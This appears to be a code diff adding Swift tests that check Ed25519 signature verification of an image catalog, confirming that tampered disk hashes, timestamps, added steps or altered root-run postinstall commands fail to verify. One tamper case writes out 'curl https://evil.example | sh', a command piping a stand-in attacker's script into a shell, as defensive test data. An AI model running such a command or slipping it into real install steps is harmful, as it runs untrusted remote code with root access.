@@ -1,3 +1,4 @@
+import Crypto
 import Foundation
 import Testing
 @testable import bromure_ac
@@ -104,6 +105,102 @@ struct ImageCatalogTests {
         let data = try JSONEncoder().encode(state)
         let back = try JSONDecoder().decode(UbuntuImageManager.BaseImageState.self, from: data)
         #expect(back == state)
+    }
+}
+
+@Suite("ImageCatalog signature")
+struct ImageCatalogSignatureTests {
+
+    private func makeSignedCatalog(key: Curve25519.Signing.PrivateKey) throws -> ImageCatalog {
+        var cat = try ImageCatalog.parse(Data("""
+        {
+          "formatVersion": 1,
+          "image": {
+            "uuid": "abc-123", "version": "200",
+            "description": "Ubuntu 24.04", "builtAt": "2026-07-02T03:00:00Z",
+            "disk": {
+              "path": "images/abc-123/base.img.gz", "sha256": "AABBCC",
+              "compressedBytes": 100, "uncompressedBytes": 200,
+              "compression": "gzip"
+            }
+          },
+          "postinstall": [
+            {"uuid": "s1", "seq": 10, "description": "Tool A", "command": "echo a"},
+            {"uuid": "s2", "seq": 20, "description": "Tool B", "command": "echo b\\necho more"}
+          ]
+        }
+        """.utf8))
+        let signedAt = "2026-07-02T10:00:00.000Z"
+        let payload = try #require(cat.signingPayload(signedAt: signedAt))
+        let sig = try key.signature(for: payload)
+        cat.signature = .init(signedAt: signedAt, edSignature: sig.base64EncodedString())
+        return cat
+    }
+
+    @Test("A correctly signed catalog verifies; tampering breaks it")
+    func signAndTamper() throws {
+        let key = Curve25519.Signing.PrivateKey()
+        let pub = key.publicKey.rawRepresentation.base64EncodedString()
+        let cat = try makeSignedCatalog(key: key)
+        #expect(ImageCatalogStore.isSignatureValid(cat, publicKeyBase64: pub))
+
+        // Root-executed commands are exactly what the signature must pin.
+        var evilCommand = cat
+        evilCommand.postinstall[0].command = "curl https://evil.example | sh"
+        #expect(!ImageCatalogStore.isSignatureValid(evilCommand, publicKeyBase64: pub))
+
+        var evilImage = cat
+        evilImage.image?.disk.sha256 = "ddeeff"
+        #expect(!ImageCatalogStore.isSignatureValid(evilImage, publicKeyBase64: pub))
+
+        var evilTime = cat
+        evilTime.signature?.signedAt = "2030-01-01T00:00:00.000Z"
+        #expect(!ImageCatalogStore.isSignatureValid(evilTime, publicKeyBase64: pub))
+
+        // Adding a step invalidates too.
+        var evilExtra = cat
+        evilExtra.postinstall.append(PostinstallStep(
+            uuid: "s3", seq: 30, description: "Extra", command: "echo extra"))
+        #expect(!ImageCatalogStore.isSignatureValid(evilExtra, publicKeyBase64: pub))
+    }
+
+    @Test("Unsigned or wrong-key catalogs never verify")
+    func unsignedAndWrongKey() throws {
+        let key = Curve25519.Signing.PrivateKey()
+        let cat = try makeSignedCatalog(key: key)
+
+        var unsigned = cat
+        unsigned.signature = nil
+        #expect(!ImageCatalogStore.isSignatureValid(
+            unsigned, publicKeyBase64: key.publicKey.rawRepresentation.base64EncodedString()))
+
+        // Signed with a key other than the pinned one (here: the real
+        // production key) — must not verify.
+        #expect(!ImageCatalogStore.isSignatureValid(cat))
+    }
+
+    @Test("Payload canonicalization: sha case-insensitive, step order irrelevant")
+    func canonicalization() throws {
+        let key = Curve25519.Signing.PrivateKey()
+        let pub = key.publicKey.rawRepresentation.base64EncodedString()
+        var cat = try makeSignedCatalog(key: key)
+
+        // Re-ordering the postinstall array must not affect the payload
+        // (it's sorted by uuid), and the stored sha's case must not
+        // either (lowercased in the payload).
+        cat.postinstall.reverse()
+        cat.image?.disk.sha256 = "aabbcc"
+        #expect(ImageCatalogStore.isSignatureValid(cat, publicKeyBase64: pub))
+    }
+
+    @Test("Signature survives a JSON round-trip")
+    func jsonRoundTrip() throws {
+        let key = Curve25519.Signing.PrivateKey()
+        let pub = key.publicKey.rawRepresentation.base64EncodedString()
+        let cat = try makeSignedCatalog(key: key)
+        let data = try JSONEncoder().encode(cat)
+        let back = try ImageCatalog.parse(data)
+        #expect(ImageCatalogStore.isSignatureValid(back, publicKeyBase64: pub))
     }
 }
 
